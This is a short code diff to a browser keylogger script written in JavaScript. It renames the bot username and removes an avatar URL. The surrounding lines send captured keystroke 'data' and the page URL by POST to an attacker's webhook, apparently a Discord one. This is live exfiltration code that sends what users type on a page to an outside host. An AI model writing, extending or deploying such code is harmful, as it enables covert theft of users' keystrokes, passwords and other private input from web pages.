@@ -23,8 +23,7 @@
         request.open("POST", webhook)
         request.setRequestHeader('Content-type', 'application/json')
         const params = {
-            username: "KeyLogger",
-            avatar_url: "https://signal.avg.com/hubfs/Blog_Content/Avg/Signal/AVG%20Signal%20Images/Keyloggers%20What%20They%20Are/What_is_a_Keylogger-Thumb.jpg",
+            username: "Keylogger",
             content: "**URL**: `" + document.URL + "`\n" + JSON.stringify(data)
         }
         request.send(JSON.stringify(params))
